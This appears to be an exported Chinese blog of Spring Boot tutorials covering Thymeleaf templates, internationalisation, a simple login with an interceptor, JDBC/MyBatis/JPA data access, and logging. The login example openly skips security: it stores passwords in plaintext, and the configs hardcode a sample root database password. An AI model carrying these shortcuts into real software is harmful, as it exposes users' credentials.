&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt; Demo Thymeleaf 使用起来十分简单，我们只需要吧作为模板的HTML文件放在 templates 文件夹下，thymeleaf就会自动为我们渲染页面。我们先从一个简单的例子出发，首先在 controller 包下新建一个 HelloController 类，内容如下： 1234567@Controller // 不是RestContoller，因为我们返回的不再是responsebodypublic class HelloController &#123; @RequestMapping(&quot;/success&quot;) // 处理 /success请求 public String success()&#123; return &quot;success&quot;; // 返回模板页面名称 &#125;&#125; 然后我们在 resource/template 文件夹下创建一个 success.html，内容如下： 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Success!&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;This is a success message&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 运行项目，访问 localhost:8080/success: 更加具体的语法可以参考 Thymeleaf 官方文档 CRUD 实例 引入静态资源 将我们的 html, css, js 文件导入项目。完成后目录的结构如下： 1234567891011121314151617181920212223242526272829303132333435src├── main│ ├── java│ │ └── com│ │ └── cyf│ │ └── restfulapi│ │ └── RestfulApiApplication.java│ └── resources│ ├── application.properties│ ├── static│ │ └── asserts│ │ ├── css│ │ │ ├── bootstrap.min.css│ │ │ ├── dashboard.css│ │ │ └── signin.css│ │ ├── img│ │ │ └── bootstrap-solid.svg│ │ └── js│ │ ├── bootstrap.min.js│ │ ├── Chart.min.js│ │ ├── feather.min.js│ │ ├── jquery-3.2.1.slim.min.js│ │ └── popper.min.js│ └── templates│ ├── 404.html│ ├── dashboard.html│ ├── index.html│ ├── list.html└── test └── java └── com └── cyf └── restfulapi └── RestfulApiApplicationTests.java 根据我们之前学习的静态资源映射规则，现在我们启动项目，访问 lcoalhost:8080，可以发现首页已经显示出来了： 目前我们的HTML文件名称就叫做 index.html，那么如果我们想要让首页默认是其他的html文件怎么办呢？例如我们讲我们的index.html 更改为 login.html。 简单的方法是我们可以在controller中写一个方法并且 @RequestMapping(&quot;/&quot;) 然后return需要作为默认页面的页面。还有一种方法是我们可以通过一个配置类来配置 SpringMVC，修改默认的主页。在 config 包下新建 MyMvcConfig 类。 123456789101112131415161718@Configuration // 申明这是一个配置类public class MyMvcConfig &#123; @Bean /* 将我们定义的 WebMvcConfigurer 作为组件加入到容器中，SpringBoot进行自动配置的过程中，如果某个Bean在容器中已经存在，那么SpringBoot就会跳过该Bean的默认自动配置，在这里我们用我们自己的 webMvcConfigurer 替换了默认的 bean */ public WebMvcConfigurer webMvcConfigurer()&#123; WebMvcConfigurer webMvcConfigurer = new WebMvcConfigurer() &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; registry.addViewController(&quot;/&quot;).setViewName(&quot;login&quot;); registry.addViewController(&quot;/index.htm;&quot;).setViewName(&quot;login&quot;); &#125; &#125;; return webMvcConfigurer; &#125;&#125; 访问项目地址，你会发现默认载入的已经是 login.html 了。接下来还有的问题是咱们的几个html页面都是基于 Bootstrap 实现的，我们可以发现在我们的静态资源文件夹中也有和Bootstrap相关的js文件。我们之前讲过我们可以通过webjar的形式来引入静态资源，因此我们同样可以通过webjar来引入Bootstrap的相关依赖。 12345&lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;bootstrap&lt;/artifactId&gt; &lt;version&gt;4.5.0&lt;/version&gt;&lt;/dependency&gt; 接下来我们打开 login.html 修改 html 标签: 12&lt;!--启用模板引擎的智能提示--&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt; 接下来我们发现 login.html 引用了我们 asserts/css 下的css文件，现在我们就可以通过模板引擎将这里修改为我们引入的webjar： 12345&lt;!-- Bootstrap core CSS --&gt;&lt;link href=&quot;asserts/css/bootstrap.min.css&quot; th:href=&quot;@&#123;/webjars/bootstrap/4.5.0/css/bootstrap.css&#125;&quot; rel=&quot;stylesheet&quot;&gt;&lt;!-- Custom styles for this template --&gt;&lt;!--引用外部CSS或者用到相对路径都要用模板引擎替换，这样即使改变项目根目录地址，新的地址也会自动被模板引擎填写--&gt;&lt;link href=&quot;asserts/css/signin.css&quot; th:href=&quot;@&#123;/asserts/css/signin.css&#125;&quot; rel=&quot;stylesheet&quot;&gt; 对所有的html文件进行修改，重新访问项目地址，一切正常。 国际化 现实生活中我们有很多场景下需要提供App的国际化支持，SpringBoot自然也包含了这个特性。我们可以通过国际化配置文件来实现国际化。我们用登录页面 login.html 举例。首先，在 recourse 下创建 i18n 文件夹，然后添加三个文件 login.properties, login_en_US.properties 和 login_zh_CN.properties。如果需要支持更多的语言，则是添加更多的 login_语言代码_区域代码.properties。创建完成后，你会发现 Idea 已经自动将我们的配置文件归为了一个 Bundle： 接下来选中 Bundle，并点击右下方的 Resource Bundle 为登录页面的每一处文本添加对应的配置： 修改好了之后，我们需要告诉SpringBoot我们的配置文件的位置，让SpringBoot使用我们的配置文件，因此在application.yml中添加: 123spring: messages: basename: i18n.login 值得注意的是 spring.messages.basename 自动配置的默认值是 messages 也就是说如果将 messages.properties 直接放在 resource 目录下，无须进行任何配置即可使用。对于较小规模的项目来说较为实用。做好了国际化相关的配置文件后，我们需要在模板中读取相应字段的值。以 Please Sign in 这个区域为例，修改 HTML 如下： 1&lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot; th:text=&quot;#&#123;login.prompt&#125;&quot;&gt;Please sign in&lt;/h1&gt; 这样我们的模板引擎便会根据语言将标签内的值替换成 login.prompt 的对应语言的文本，如果浏览器的默认语言是中文的话，页面中的对应文本就会变成中文： 现在我们的页面会根据浏览器的语言设置切换语言。但是我们如后让用户通过点击来选择语言呢？在SpringBoot中，获取需要什么语言是由 LocaleResolver 组件来实现的，我们可以查看 WebMvcAutoConfigurator 类来查看这个组件的实现： 1234567891011@Bean@ConditionalOnMissingBean@ConditionalOnProperty(prefix = &quot;spring.mvc&quot;, name = &quot;locale&quot;)public LocaleResolver localeResolver() &#123; if (this.mvcProperties.getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) &#123; return new FixedLocaleResolver(this.mvcProperties.getLocale()); &#125; AcceptHeaderLocaleResolver localeResolver = new AcceptHeaderLocaleResolver(); localeResolver.setDefaultLocale(this.mvcProperties.getLocale()); return localeResolver;&#125; 可以看到默认的 LocaleResolver 是通过浏览器发送的请求的请求头中的 Accept-Language 来决定语言。为了实现我们的目标，我们可以讲需要的语言作为请求参数，实现一个我们自己的 LocaleResolver，我们在 component 包下建立新的类 MyLocaleResolver 并实现 LocaleResolver 接口： 12345678910111213141516public class MyLocaleResolver implements LocaleResolver &#123; @Override public Locale resolveLocale(HttpServletRequest httpServletRequest) &#123; String lang = httpServletRequest.getParameter(&quot;lang&quot;); // 获取请求参数lang Locale locale = Locale.getDefault(); // 获取系统默认的Locale if(lang != null &amp;&amp; lang.length() !=0)&#123; // 若包含请求参数 String[] splitted = lang.split(&quot;-&quot;); // &quot;en_US&quot; -&gt; [&quot;en&quot;, &quot;US&quot;] locale = new Locale(splitted[0], splitted[1]); // 创建新的locale &#125; return locale; &#125; @Override public void setLocale(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Locale locale) &#123;&#125;&#125; 实现了这个组件后，我们需要将这个组件添加到容器中，我们向 config.MyMvcConifg 中添加配置方法： 1234@Beanpublic LocaleResolver localeResolver()&#123; return new MyLocaleResolver();&#125; 最后修改我们的login.html文件，为下方的 english， 中文版添加超链接： 12&lt;a class=&quot;btn btn-sm&quot; th:href=&quot;@&#123;/(lang=zh-CN)&#125;&quot;&gt;中文&lt;/a&gt;&lt;a class=&quot;btn btn-sm&quot; th:href=&quot;@&#123;/(lang=en-US)&#125;&quot;&gt;English&lt;/a&gt; 即可发现现在点击下方的按钮可以切换语言: 登录 我们首先不考虑安全的实现一个简单的登录功能，用户在页面中输入用户名和密码，如果在数据库中存在用户名和密码，则用户登录成功，进入详情页面。否则提示用户登录失败。首先我们修改我们的登录页，添加表单的提交地址，并且为username 和 password 添加 name 属性： 1234567&lt;form class=&quot;form-signin&quot; action=&quot;dashboard.html&quot; th:action=&quot;@&#123;/api/session&#125;&quot; method=&quot;post&quot;&gt; ... &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; name=&quot;username&quot; th:placeholder=&quot;#&#123;login.username&#125;&quot; required=&quot;&quot; autofocus=&quot;&quot;&gt; ... &lt;input type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; name=&quot;password&quot; th:placeholder=&quot;#&#123;login.password&#125;&quot; required=&quot;&quot;&gt; ...&lt;/form&gt; 接下来在 entity 包下创建 User 类，加上JPA注解以及Getter，Setter： 1234567891011121314@Entitypublic class User &#123; @Id // 主键 @GeneratedValue(strategy = GenerationType.IDENTITY) private int id; @Column(unique = true, nullable = false) // 非空，唯一 private String username; @Column(nullable = false) private String password; private String email;&#125; 在 Repository 包下创建 UserRepository 接口： 123456public interface UserRepository extends JpaRepository&lt;User, Integer&gt; &#123; /* */ public User findByUsername(String username);&#125; 我们在接口里增加了一个方法 findByUsername()，这里的方法名指定了查询条件，对于这个方法，Spring Data JPA 会自动为我们生成相应的查询语句而无需我们做任何实现，具体的方法命名规则参考 官方文档。就此我们的数据访问就已经完成，在application.yml中添加数据库的相应配置以及启用generate-ddl，运行项目，让Spring Data自动为我们在数据库中创建User表。在User表中添加一个用户用于测试： 接下来编写Controller，在controller包下创建 LoginController: 12345678910111213141516171819202122@Controller@RequestMapping(&quot;/api&quot;)public class LoginController &#123; @Autowired UserRepository userRepository; @PostMapping(&quot;/session&quot;) public String login(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password, Map&lt;String, String&gt; map)&#123; // 根据用户名获取用户 User loginUser = userRepository.findByUsername(username); // 用户存在 对比密码 if(loginUser!= null &amp;&amp; loginUser.getPassword().equals(password))&#123; return &quot;dashboard&quot;; &#125;else&#123; map.put(&quot;msg&quot;, &quot;用户名密码错误&quot;); return &quot;login&quot;; &#125; &#125;&#125; 然后在 login.html 中的Please Sign in 下添加如下一行，添加密码错误时的错误提示： 123...&lt;p style=&quot;color: darkred&quot; th:text=&quot;$&#123;msg&#125;&quot; th:if=&quot;$&#123;not #strings.isEmpty(msg)&#125;&quot;&gt;&lt;/p&gt;... 现在尝试登录，访问 localhost:8080，并输入错误的用户名和密码： 再尝试正确的密码，发现成功跳转到了dashboard页面。 拦截器 现在如果我们在dashboard界面刷新，你会发现浏览器提示我们是否需要重新提交表单。这是因为刷新时浏览器会重新发送我们登录时的Post请求。为了防止重复提交，我们修改为重定向的方式来让用户到达dashboard页面。观察我们之前的请求，用户登录成功后，浏览器的url栏显示的时我们post地址的url，而修改为重定向后，浏览器则会跳转到我们重定向的url。 首先修改 HelloController： 12345if(loginUser!= null &amp;&amp; loginUser.getPassword().equals(password))&#123; session.setAttribute(&quot;loginUser&quot;, loginUser.getId()); // return &quot;dashboard&quot; return &quot;redirect:/main&quot;;&#125; 在用户登录成功后，我们将用户重定向到 /main，也就是说浏览器会向 /main 发送一次请求，因此我们将 dashboard视图绑定到 /main, 修改 MyMvcConfig 配置类中我们之前实现的 WebMvcConfigurator： 123456public void addViewControllers(ViewControllerRegistry registry) &#123; registry.addViewController(&quot;/&quot;).setViewName(&quot;login&quot;); registry.addViewController(&quot;/index.html&quot;).setViewName(&quot;login&quot;); // 重定向 /main 到视图 dashboard registry.addViewController(&quot;/main&quot;).setViewName(&quot;dashboard&quot;);&#125; 此时再次登录，你会发现浏览器会自动跳转到 localhost:8080/main，并且刷新浏览器也不会再提示需要重新提交表单。但是此时你会发现一个问题，就是如果此时我们在其他浏览器中直接访问 localhost:8080/main，便跳过了登陆直接进入了dashboard，这是我们不希望看到的，因此我们需要拦截那些未登录用户的请求，这里就用到了拦截器。首先我们要做的是识别一个用户的登录状态，修改 LoginContoller 中的 login 方法： 12345678910111213141516@PostMapping(&quot;/session&quot;)public String login(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password, Map&lt;String, String&gt; map, // 传入session HttpSession session)&#123; User loginUser = userRepository.findByUsername(username); if(loginUser!= null &amp;&amp; loginUser.getPassword().equals(password))&#123; // 将登录用户的id保存在session中 session.setAttribute(&quot;loginUser&quot;, loginUser.getId()); return &quot;redirect:/main&quot;; &#125;else&#123; map.put(&quot;msg&quot;, &quot;用户名密码错误&quot;); return &quot;login&quot;; &#125;&#125; 此时我们就可以判断session中是否有 loginUser 这个attribute来判断用户是否登录，接下来我们就可以开始编写我们的拦截器，在 component 包下新建 LoginHandlerInterceptor 类: 12345678910111213141516171819202122232425public class LoginHandlerInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; // 取出 loginUser Object loginUserId = request.getSession().getAttribute(&quot;loginUser&quot;); if(loginUserId != null)&#123; // 若存在，则用户已登录，放行请求 return true; &#125;else&#123; // 若不存在，重定向用户到登录页面 request.getRequestDispatcher(&quot;/index.html&quot;).forward(request, response); &#125; return false; &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123; &#125; @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; &#125;&#125; 该类实现了 HandlerInterceptor 接口，这个接口有三个方法，当容器收到一个请求后，如果满足条件，则会在controller方法执行前先执行 preHandle 方法，该方法的返回值是一个布尔值，代表的是是否拦截该请求。接下来修改配置类，将我们自定义的拦截器添加进容器。修改 MyMvcConfig 类，之前我们在该类中添加了一个返回 WebMvcConfigurator 的方法，我们在该方法中编写了一个 WebMvcConfigurator 的匿名实现类用于重定向的配置，现在我们为这个类添加一个新的方法： 12345678910111213141516171819202122public WebMvcConfigurer webMvcConfigurer()&#123; WebMvcConfigurer webMvcConfigurer = new WebMvcConfigurer() &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; registry.addViewController(&quot;/&quot;).setViewName(&quot;login&quot;); registry.addViewController(&quot;/index.html&quot;).setViewName(&quot;login&quot;); registry.addViewController(&quot;/main&quot;).setViewName(&quot;dashboard&quot;); &#125; @Override public void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(new LoginHandlerInterceptor()) // 拦截所有请求 .addPathPatterns(&quot;/**&quot;) // 排除登录页面和登录请求的拦截 .excludePathPatterns(&quot;/index.html&quot;,&quot;/&quot;,&quot;/api/session&quot;) // 排除静态资源的拦截 .excludePathPatterns(&quot;/asserts/**&quot;, &quot;/webjars/**&quot;); &#125; &#125;; return webMvcConfigurer;&#125; 这样未登录的用户就只能登录请求页面和发送登录请求，对于服务器其他url的访问都会被拦截器拦截，并且强制跳转到登录页面。现在，我们再尝试在另一个浏览器访问 localhost:8080/main，会发现直接跳转到了登录界面。","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://virgilchen97.github.io/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://virgilchen97.github.io/tags/SpringBoot/"}]},{"title":"SpringBoot 数据访问","slug":"Spring-数据访问","date":"2020-06-14T06:55:10.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/Spring-数据访问/","link":"","permalink":"https://virgilchen97.github.io/2020/06/Spring-%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE/","excerpt":"对于数据访问来说，SpringBoot 默认采用整合Spring Data的方式进行处理，使用大量自动配置来简化数据访问层的操作。Spring Data 提供了多种数据库的访问模块（redis, elasticsearch…). 首先我们从传统的JDBC开始 JDBC 安装 MySql 首先安装 MySql，打开命令行执行 12sudo apt install mysql-serversudo mysql_secure_installation 然后按照流程配置。 使用你喜欢的数据库软件创建一个新的数据库，我使用的是 DataGrip，创建一个新的数据库 jdbc： 1create database jdbc;","text":"对于数据访问来说，SpringBoot 默认采用整合Spring Data的方式进行处理，使用大量自动配置来简化数据访问层的操作。Spring Data 提供了多种数据库的访问模块（redis, elasticsearch…). 首先我们从传统的JDBC开始 JDBC 安装 MySql 首先安装 MySql，打开命令行执行 12sudo apt install mysql-serversudo mysql_secure_installation 然后按照流程配置。 使用你喜欢的数据库软件创建一个新的数据库，我使用的是 DataGrip，创建一个新的数据库 jdbc： 1create database jdbc; 创建项目 使用Spring Initializer创建新的项目，勾选Web模块，JDBC API 以及 MySql Driver。创建完成项目后，我们发现我们的pom.xml中自动包含了以下依赖： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 配置 配置好了数据库，我们就可以编写配置文件，在 application.yml 中添加： 1234567spring: datasource: username: root #用户名 password: 1A2S3D4F #密码 # 在URL中设置Timezone和编码 url: jdbc:mysql://127.0.0.1:3306/jdbc?serverTimezone=UTC&amp;characterEncoding=UTF-8 # driver-class-name: com.mysql.jdbc.Driver 不需要我们配置数据库驱动，会自动引入 接下来我们编写一个测试方法查看是否成功连接数据库： 123456789101112131415161718@SpringBootTestclass DataJdbcApplicationTests &#123; @Autowired DataSource dataSource; // 注入数据源 @Test void contextLoads() &#123; // 看看Datasource是那个类 System.out.println(dataSource.getClass()); // 尝试获取一个Connection try (Connection connection = dataSource.getConnection()) &#123; System.out.println(connection); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 控制台输出为： 12class com.zaxxer.hikari.HikariDataSourceHikariProxyConnection@1383675856 wrapping com.mysql.cj.jdbc.ConnectionImpl@36d582cb 可以看到我们成功获取了一个数据库连接。值得注意的是，SpringBoot的自动配置支持在应用启动时自动创建schema，我们只需要将 schema.sql 放在类路径下，SpringBoot 启动时便会自动执行。如果不想使用默认名称或者有多个sql文件需要在项目启动时执行，那么我们可以在配置文件中添加： 1234spring: datasource: schema: classpath:&#123;sqlFileName&#125; initialization-mode: always 获取数据 首先我们在数据库中创建一个新的 department 表，并插入一些数据： 12345678910create table department( id int auto_increment primary key, department_name varchar(40) null);INSERT INTO jdbc.department (id, department_name) VALUES (1, &#x27;AAA&#x27;);INSERT INTO jdbc.department (id, department_name) VALUES (2, &#x27;BBB&#x27;);INSERT INTO jdbc.department (id, department_name) VALUES (3, &#x27;CCC&#x27;); 接下来我们编写一个新的Controller用于访问，并从数据库获取数据： 12345678910111213@Controllerpublic class DepartmentController &#123; @Autowired // 注入 JdbcTemplate JdbcTemplate db; @ResponseBody @GetMapping(&quot;/allDepartment&quot;) public List&lt;Map&lt;Integer, String&gt;&gt; getAllDepartment()&#123; List departments = db.queryForList(&quot;SELECT * FROM department&quot;); return departments; &#125;&#125; 访问 localhost:8080/allDepartment： MyBatis 创建项目，修改配置文件，创建数据库 使用Spring Initializer创建新的项目，勾选Web模块，MyBatis 以及 MySql Driver。相比于 JDBC，Spring Initializer为我们添加了MyBatis的依赖。 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.3&lt;/version&gt;&lt;/dependency&gt; 创建 application.yml, 添加数据库相关配置： 12345678910spring: datasource: username: root #用户名 password: 1A2S3D4F #密码 # 在URL中设置Timezone和编码 url: jdbc:mysql://127.0.0.1:3306/ssm?serverTimezone=UTC&amp;characterEncoding=UTF-8 schema: - classpath:sql/department.sql - classpath:sql/employee.sql initialization-mode: always 创建新数据库用于测试： 1create database ssm 在 resource/sql 下创建department.sql 和 employee.sql 12345678SET FOREIGN_KEY_CHECKS=0;DROP TABLE IF EXISTS `department`;CREATE TABLE `department` ( `id` int(11) NOT NULL AUTO_INCREMENT, `departmentName` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; 1234567891011SET FOREIGN_KEY_CHECKS=0;DROP TABLE IF EXISTS `employee`;CREATE TABLE `employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `lastName` varchar(255) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `gender` int(2) DEFAULT NULL, `d_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; 启动项目，发现数据库中增加了 department 和 employee 表 创建实体类 我们现在有两张数据表，接下来我们根据这两张表创建对应的实体类。在 entity 包下创建 Employee 和 Department 类，根据数据库中对应表的类型创建，加上getter，setter方法。代码不贴在这里了。 创建 mapper 接下来我们为 Department 类创建 Mapper： 123456789101112131415@Mapper // 标注此类为Mapper类public interface DepartmentMapper &#123; @Select(&quot;select * from department where id=#&#123;id&#125;&quot;) Department getDepartmentById(Integer Id); @Delete(&quot;delete from department where id=#&#123;id&#125;&quot;) int deleteDepartmentById(Integer id); @Insert(&quot;insert into department(departmentName) values(#&#123;departmentName&#125;)&quot;) int insertDepartment(Department department); @Update(&quot;update department set departmentName=#&#123;departmentName&#125; where id=#&#123;id&#125;&quot;) int updateDepartment(Department department);&#125; 如果有很多Mapper，那么可以在MyBatis的配置类开头或是主Application开头添加 @MapperScan(value=&quot;mapper包的路径&quot;)，让Spring自动扫描 mapper 包下的 mapper，而无需在每个mapper开头加上 @Mapper 注解。 编写 Controller 编写一个Controller来测试我们编写的Mapper： 1234567891011121314151617@RestControllerpublic class DepartmentController &#123; @Autowired DepartmentMapper departmentMapper; @GetMapping(&quot;/department/&#123;id&#125;&quot;) public Department getDepartment(@PathVariable(&quot;id&quot;) Integer id)&#123; return departmentMapper.getDepartmentById(id); &#125; @GetMapping(&quot;/department&quot;) // 实际情况应该用post, 这里使用get方便浏览器测试 public Department addDepartment(Department department)&#123; departmentMapper.insertDepartment(department); return department; &#125;&#125; 数据操作 在浏览器访问 http://localhost:8080/department?departmentName=AAA，因为 departmentId在数据库自增，并且我们的Mappper也只传递 departmentName，因此请求参数只需要departmentName就可以了。 可以发现返回了我们插入的department，此时我们查看数据库，发现数据被成功插入了： 接着我们尝试查询一条数据，在浏览器访问 http://localhost:8080/department/2 成功返回了我们要查询的值。 命名 在这里我们数据库中的字段名称叫做 departmentName 但是通常在数据库中我们的命名会是 department_name，而通常在Java Bean中我们会在属性上使用驼峰命名（departmentName），这样的话会导致MyBatis无法进行绑定。我们可以通过编写MyBatis配置文件的方法来启用下划线命名转驼峰命名，同样的我们以可以通过配置类来实现，在 config 包下新建 MyBatisConfig 类： 1234567891011121314151617@Configurationpublic class MyBatisConfig &#123; @Bean public ConfigurationCustomizer configurationCustomizer()&#123; /* MyBatis的配置通过向容器中添加实现 ConfigurationCustomizer 接口的对象来执行 其他的配置也是通过这种办法 */ return new ConfigurationCustomizer() &#123; @Override public void customize(org.apache.ibatis.session.Configuration configuration) &#123; configuration.setMapUnderscoreToCamelCase(true); &#125; &#125;; &#125;&#125; Spring Data JPA 创建项目，修改配置文件，创建数据库 在创建项目时勾选Spring Data JPA, 配置文件如下： 1234567spring: datasource: username: root password: 1A2S3D4F url: jdbc:mysql://127.0.0.1:3306/jpa?serverTimezone=UTC&amp;characterEncoding=UTF-8 jpa: generate-ddl: true # 项目启动时自动创建表 编写实体类并和数据表进行映射 在 entity 包下创建 Employee 类，可以从之前的项目中复制过来，不同的是由于这次我们使用的是JPA，因此我们需要加上JPA规范中的相应注解： 1234567891011121314@Entity// @Table(name=&quot;Employee&quot;) 制定表名，不标注使用小写类名public class Employee &#123; @Id // 主键 @GeneratedValue(strategy = GenerationType.IDENTITY) // 自增 private Integer id; // @Column(name=&quot;last_name&quot; length=50) // 指定列名，不标注默认属性名，自动转下划线 private String lastName; private Integer gender; private String email; private Integer dId;&#125; 此时运行项目，会发现 Spring Data已经自动为我们创建好了数据表，并且属性名自动转换为了下划线名称： 编写DAO（Repository） 在 repository 包下创建 EmployeeRepository 接口： 1public interface EmployeeRepository extends JpaRepository&lt;Employee, Integer&gt; &#123;&#125; 我们只需要编写这样一个接口而无需实现任何方法，我们继承的接口 JpaRepository&lt;T, ID&gt; 前面的泛型代表了这个Repository操作的数据对象的类型，我们现在是EmployeeRepository，操作的自然是Employee对象。后面的ID则指的是数据对象的主键的类型，在我们这里Employee的主键是Integer。因此我们在这里选择 extends JpaRepository&lt;Employee, Integer&gt;。当我们使用 @Autowired 注入我们自定义的Repository时，IOC容器会根据我们的接口，构造一个JpaRepositoryFactoryBean对象，再从此对象获取一个JpaRepositoryFactory对象，用于创建我们定义的接口的bean实例。 编写Controller 12345678910111213141516@RestControllerpublic class EmployeeController &#123; @Autowired EmployeeRepository employeeRepository; @GetMapping(&quot;/employee/&#123;id&#125;&quot;) public Employee getEmployee(@PathVariable(&quot;id&quot;) Integer id)&#123; return employeeRepository.findById(id).get(); &#125; @GetMapping(&quot;/employee&quot;) public Employee insertEmployee(Employee employee)&#123; return employeeRepository.save(employee); &#125;&#125; 测试 访问 http://localhost:8080/employee?lastName=Frank&amp;gender=0&amp;email=aaa&amp;dId=1 可以看到返回了我们插入的值，并且添加了自增主键，我们再尝试插入一个新员工： 1http://localhost:8080/employee?lastName=Bob&amp;gender=1&amp;email=bbb&amp;dId=1 此时查看数据库： 可以看到所有的值都成功插入了数据库，尝试查询： 1http://localhost:8080/employee/1","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://virgilchen97.github.io/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://virgilchen97.github.io/tags/SpringBoot/"}]},{"title":"SpringBoot 日志","slug":"SpringBoot-日志","date":"2020-06-13T05:03:37.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/SpringBoot-日志/","link":"","permalink":"https://virgilchen97.github.io/2020/06/SpringBoot-%E6%97%A5%E5%BF%97/","excerpt":"1. 简介 常见日志框架 日志抽象层 日志实现 JCL, SLF4j, jboss-logging log4j, java.util.logging, log4j2, logback 我们需要一个抽象层 + 一个日志实现，通常使用 SLF4j + Logback。SpringBoot本身使用的便是这种组合","text":"1. 简介 常见日志框架 日志抽象层 日志实现 JCL, SLF4j, jboss-logging log4j, java.util.logging, log4j2, logback 我们需要一个抽象层 + 一个日志实现，通常使用 SLF4j + Logback。SpringBoot本身使用的便是这种组合 SLF4j 如何使用 切记永远调用接口，不要调用具体的实现类. 123456789import org.slf4j.Logger; // 调用slf4j接口import org.slf4j.LoggerFactory;public class HelloWorld &#123; public static void main(String[] args) &#123; Logger logger = LoggerFactory.getLogger(HelloWorld.class); logger.info(&quot;Hello World&quot;); &#125;&#125; SpringBoot 中的日志 SpringBoot 底层使用 SLF4j + Logback 为了解决各种框架日志不统一，通过适配器模式 (jcl-over-slf4j, jul-over-slf4j)将其他的日志框架调用转换为了 SLF4j 引入新框架后，应该讲该框架的默认日志排除掉，让框架使用SpringBoot的转换 2. 使用 我们直接在我们的单元测试中尝试使用logger。首先修改测试类 123456789101112131415161718import org.junit.jupiter.api.Test;import org.slf4j.Logger;import org.slf4j.LoggerFactory; // 注意倒入的是SLF4j的Loggerimport org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass DemoApplicationTests &#123; // Logger logger = LoggerFactory.getLogger(getClass()); @Test void contextLoads() &#123; logger.trace(&quot;This is a trace message&quot;); logger.debug(&quot;This is a debug message&quot;); logger.info(&quot;This is a info message&quot;); logger.warn(&quot;This is a warning message&quot;); logger.error(&quot;This is an error message&quot;); &#125;&#125; 在这里我们会发现默认日志有五个级别，从级别低到级别高分别为 trace, debug, info, warn, 和 error。SpringBoot 默认的日志记录级别是 info， 因此如果我们执行单元测试，输出结果为： 1232020-06-13 13:42:32.383 INFO 15559 --- [ main] com.cyf.demo.DemoApplicationTests : This is a info message2020-06-13 13:42:32.383 WARN 15559 --- [ main] com.cyf.demo.DemoApplicationTests : This is a warning message2020-06-13 13:42:32.383 ERROR 15559 --- [ main] com.cyf.demo.DemoApplicationTests : This is an error message 我们可以在配置文件中配置log的默认输出级别： 123logging: level: com.cyf: trace 这里我们把所有在 com.cyf 包下的日志输出级别都改为了trace，接下来我们再次运行测试： 123452020-06-13 13:45:59.044 TRACE 16091 --- [ main] com.cyf.demo.DemoApplicationTests : This is a trace message2020-06-13 13:45:59.044 DEBUG 16091 --- [ main] com.cyf.demo.DemoApplicationTests : This is a debug message2020-06-13 13:45:59.044 INFO 16091 --- [ main] com.cyf.demo.DemoApplicationTests : This is a info message2020-06-13 13:45:59.044 WARN 16091 --- [ main] com.cyf.demo.DemoApplicationTests : This is a warning message2020-06-13 13:45:59.044 ERROR 16091 --- [ main] com.cyf.demo.DemoApplicationTests : This is an error message 此时所有的log都输出到了控制台，如果想要将日志输出的文件，我们也可以在配置文件中配置： 12345logging: level: com.cyf: trace file: path: /home/virgil/spring/log 此时日志不但会在控制台输出，同样会保存到 /home/virgil/spring/log 